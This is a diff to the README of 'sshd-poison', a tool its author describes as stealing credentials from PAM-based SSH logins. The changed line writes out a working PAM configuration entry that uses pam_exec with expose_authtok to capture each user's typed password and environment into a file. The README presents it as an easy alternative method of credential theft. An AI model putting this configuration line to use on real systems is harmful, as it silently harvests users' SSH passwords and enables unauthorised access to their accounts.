@@ -2,7 +2,7 @@
 
 sshd-poison is a tool to get creds of pam based sshd authentication,
 this is not the easiest way to do that (you can create a pam module, or just add
-`auth optional pam_exec.so quiet expose_authtok /bin/bash -c {read,-r,x};{echo,-e,"`env`\n$x"}>>somefile`
+```auth optional pam_exec.so quiet expose_authtok /bin/bash -c {read,-r,x};{echo,-e,"`env`\n$x"}>>somefile```
 in a service configuration), not even the stealthiest (the tool don't have any mechanism to try hide yourself,
 and needs control the main sshd pid all the time), but code this gave me a lot of fun.
 
